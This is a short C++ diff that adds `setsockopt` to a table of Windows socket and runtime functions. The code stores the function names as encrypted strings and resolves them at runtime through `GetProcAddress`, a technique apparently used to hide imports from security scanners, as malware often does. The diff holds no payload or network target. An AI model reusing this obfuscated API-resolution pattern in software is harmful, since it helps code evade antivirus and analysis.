@@ -47,6 +47,7 @@ namespace Funcs
    Types::T_connect                        pConnect;
    Types::T_send                           pSend;
    Types::T_recv                           pRecv;
+   Types::T_setsockopt                     pSetsockopt;
    Types::T_closesocket                    pClosesocket;
    Types::T_WSACleanup                     pWSACleanup;
    Types::T_memset                         pMemset;
@@ -232,6 +233,7 @@ namespace Strs
    const char *connect;
    const char *send;
    const char *recv;
+   const char *setsockopt;
    const char *closesocket;
    const char *wsaCleanup;
    const char *memset;
@@ -544,6 +546,7 @@ void InitApi()
    Strs::connect                   = ENC_STR_A"connect"END_ENC_STR;
    Strs::send                      = ENC_STR_A"send"END_ENC_STR;
    Strs::recv                      = ENC_STR_A"recv"END_ENC_STR;
+   Strs::setsockopt                = ENC_STR_A"setsockopt"END_ENC_STR;
    Strs::closesocket               = ENC_STR_A"closesocket"END_ENC_STR;
    Strs::wsaCleanup                = ENC_STR_A"WSACleanup"END_ENC_STR;
    Strs::memset                    = ENC_STR_A"memset"END_ENC_STR;
@@ -854,6 +857,7 @@ void InitApi()
    Funcs::pConnect                        = (Types::T_connect)                        Funcs::pGetProcAddress(hWs2_32, Strs::connect);
    Funcs::pSend                           = (Types::T_send)                           Funcs::pGetProcAddress(hWs2_32, Strs::send);
    Funcs::pRecv                           = (Types::T_recv)                           Funcs::pGetProcAddress(hWs2_32, Strs::recv);
+   Funcs::pSetsockopt                     = (Types::T_setsockopt)                     Funcs::pGetProcAddress(hWs2_32, Strs::setsockopt);
    Funcs::pClosesocket                    = (Types::T_closesocket)                    Funcs::pGetProcAddress(hWs2_32, Strs::closesocket);
    Funcs::pWSACleanup                     = (Types::T_WSACleanup)                     Funcs::pGetProcAddress(hWs2_32, Strs::wsaCleanup);
    Funcs::pMemset                         = (Types::T_memset)                         Funcs::pGetProcAddress(hMsvcrt, Strs::memset);
